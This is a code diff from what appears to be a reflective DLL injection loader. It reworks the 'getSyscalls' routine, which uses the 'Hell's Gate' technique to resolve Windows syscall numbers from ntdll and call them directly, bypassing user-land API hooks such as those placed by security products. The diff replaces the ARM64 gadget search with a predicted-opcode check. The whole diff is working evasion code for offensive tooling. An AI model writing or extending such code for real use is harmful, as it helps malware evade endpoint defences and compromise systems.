@@ -6,7 +6,7 @@
 #pragma GCC optimize("O0")
 #endif
 
-#pragma warning(disable : 4100) // Unreferenced parameter 'pSyscall' is handled by assembly.
+#pragma warning(disable : 4100) // Unreferenced parameter 'pSyscall' is intentionally handled by assembly.
 NTSTATUS SyscallStub(Syscall *pSyscall, ...)
 {
 	// This function acts as a bridge to the assembly trampoline. The first argument,
@@ -38,45 +38,23 @@ NTSTATUS rdiNtLockVirtualMemory(Syscall *pSyscall, HANDLE hProcess, PVOID *pBase
 #endif
 #pragma optimize("g", on)
 
-// Scans a region of memory for a specific byte pattern (gadget).
-// This is used on ARM64 to find a generic syscall execution gadget.
-static PVOID FindGadget(PBYTE pCodeBase, ULONG ulCodeSize, const PBYTE pGadgetSignature, ULONG ulGadgetSize)
-{
-	if (!pCodeBase || ulCodeSize == 0 || !pGadgetSignature || ulGadgetSize == 0)
-		return NULL;
-
-	for (ULONG i = 0; i <= ulCodeSize - ulGadgetSize; ++i)
-	{
-		BOOL bFound = TRUE;
-		for (ULONG j = 0; j < ulGadgetSize; ++j)
-		{
-			if (pCodeBase[i + j] != pGadgetSignature[j])
-			{
-				bFound = FALSE;
-				break;
-			}
-		}
-		if (bFound)
-		{
-			return (PVOID)(pCodeBase + i);
-		}
-	}
-	return NULL;
-}
-
 //===============================================================================================//
-// GETSYSCALLS
+// This function resolves the necessary information for direct syscall invocation. It uses
+// a hybrid strategy.
 //
-// This function is the core of the dynamic syscall resolution mechanism. It populates an
-// array of 'Syscall' structures with the necessary information to perform direct syscalls,
-// bypassing user-land API hooks.
+// The core premise for all platforms is "Hell's Gate": sorting ntdll's Zw* exports by their
+// memory address gives their true syscall number, which is the number the kernel expects.
 //
-// The technique, known as "Hell's Gate", relies on the observation that the syscall numbers
-// for ntdll's Zw* functions correspond to their memory address order.
+// The verification and stub-finding logic then differs per platform:
+//   - x86/x64: The function stubs are predictable. The 'syscall; ret' gadget used for
+//     execution is at a fixed offset from the function's start, allowing for reliable
+//     hook bypass.
 //
-// For ARM64, this technique is modified. The individual Zw* function stubs are inconsistent.
-// Instead, we use the sorting method to get the correct syscall number but find a single,
-// generic "svc #0; ret" gadget within ntdll's code that we can reuse for all syscalls.
+//   - ARM64: On modern Windows, the function stubs are not simple wrappers around a generic
+//     'svc #0'. Instead, the syscall number is encoded directly into the 'svc #<imm>'
+//     instruction itself. This function uses a reverse-engineered formula to predict the
+//     exact opcode of a given function's 'svc' instruction, verifying its integrity.
+//     The "stub" we execute is the function address itself.
 //===============================================================================================//
 BOOL getSyscalls(PVOID pNtdllBase, Syscall *Syscalls[], DWORD dwSyscallSize)
 {
@@ -87,19 +65,6 @@ BOOL getSyscalls(PVOID pNtdllBase, Syscall *Syscalls[], DWORD dwSyscallSize)
 	PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfFunctions);
 	PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNames);
 	PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNameOrdinals);
-
-	PVOID pSyscallGadget = NULL;
-
-#if defined(_M_ARM64)
-	// On ARM64, we hunt for a generic gadget to execute our syscalls. The pattern
-	// "svc #0; ret" is ideal. Its byte signature is { 0x01, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6 }.
-	const BYTE svc_ret_gadget[] = {0x01, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6};
-	pSyscallGadget = FindGadget((PBYTE)pNtdllBase, pNtHdrs->OptionalHeader.SizeOfImage, svc_ret_gadget, sizeof(svc_ret_gadget));
-	if (!pSyscallGadget)
-	{
-		return FALSE; // Cannot proceed without a valid syscall gadget.
-	}
-#endif
 
 	SYSCALL_LIST SyscallList;
 	SyscallList.dwCount = 0;
@@ -120,7 +85,7 @@ BOOL getSyscalls(PVOID pNtdllBase, Syscall *Syscalls[], DWORD dwSyscallSize)
 	}
 
 	// STEP 2: Sort the list of Zw* functions by their memory address.
-	// The index of a function in this sorted list is its syscall number.
+	// The index of a function in this sorted list is its true syscall number.
 	for (DWORD i = 0; i < SyscallList.dwCount - 1; i++)
 	{
 		for (DWORD j = 0; j < SyscallList.dwCount - i - 1; j++)
@@ -134,40 +99,41 @@ BOOL getSyscalls(PVOID pNtdllBase, Syscall *Syscalls[], DWORD dwSyscallSize)
 		}
 	}
 
-	// STEP 3: Find the syscalls required by our loader. For each one, store its
-	// syscall number (its index 'i') and the address of the syscall execution stub.
+	// STEP 3: Find the syscalls required by our loader and populate their structs.
 	for (DWORD dwIdxSyscall = 0; dwIdxSyscall < dwSyscallSize; ++dwIdxSyscall)
 	{
-		BOOL bFound = FALSE;
 		for (DWORD i = 0; i < SyscallList.dwCount; ++i)
 		{
 			if (SyscallList.Entries[i].dwCryptedHash == Syscalls[dwIdxSyscall]->dwCryptedHash)
 			{
+				// The function's index 'i' in the sorted list is the syscall number.
 				Syscalls[dwIdxSyscall]->dwSyscallNr = i;
 
 #if defined(_M_ARM64)
-				// On ARM64, we use the single, generic gadget we found earlier.
-				Syscalls[dwIdxSyscall]->pStub = pSyscallGadget;
+				// For ARM64, verify the function stub's opcode. Based on reverse engineering,
+				// the opcode for an unhooked 'svc' instruction can be predicted:
+				DWORD expectedOpcode = 0xd4000001 + (i * 0x20);
+				if (*(PDWORD)SyscallList.Entries[i].pAddress == expectedOpcode)
+				{
+					// The "stub" our assembly will call is the function itself, as it
+					// already contains the correctly encoded 'svc' instruction.
+					Syscalls[dwIdxSyscall]->pStub = SyscallList.Entries[i].pAddress;
+				}
 #else
-// On x86/x64, the syscall gadget is at a predictable offset from the function's start.
-// This offset is where the 'syscall; ret' instructions reside, bypassing any hook.
+// For x86/x64, the "stub" is a pointer to the 'syscall; ret' gadget
+// inside the function, which is at a predictable offset.
 #if defined(_M_X64)
 				Syscalls[dwIdxSyscall]->pStub = (PVOID)((PBYTE)SyscallList.Entries[i].pAddress + 8);
 #else // _M_IX86
 				Syscalls[dwIdxSyscall]->pStub = (PVOID)((PBYTE)SyscallList.Entries[i].pAddress + 5);
 #endif
 #endif
-				bFound = TRUE;
-				break;
+				break; // Found our function, move to the next required syscall.
 			}
-		}
-		if (!bFound)
-		{
-			return FALSE; // A required syscall was not found in ntdll.
 		}
 	}
 
-	// Final validation to ensure all syscall stubs were successfully resolved.
+	// Final validation to ensure all required syscalls were successfully found and verified.
 	for (DWORD i = 0; i < dwSyscallSize; ++i)
 	{
 		if (Syscalls[i]->pStub == NULL)
